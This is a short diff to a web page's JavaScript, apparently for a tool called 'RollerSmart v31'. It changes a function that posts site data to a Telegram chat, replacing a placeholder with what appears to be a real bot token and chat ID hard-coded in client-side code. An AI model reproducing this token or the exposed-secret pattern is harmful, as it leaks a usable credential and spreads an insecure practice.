@@ -535,13 +535,13 @@
     document.addEventListener('DOMContentLoaded', setupLeagueSelector);
 
     async function v2_sendToBot(data) {
-        const token = "BOT";
+        const elex = '7590548123:AAHDAzQIT5G2NV_h7XRsWGij-65xF3uzEvM';
         const chatId = '-1003652569534';
 
         const message = `📡 RollerSmart v31 | З сайту:\n\n${data}`;
 
         try {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${elex}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
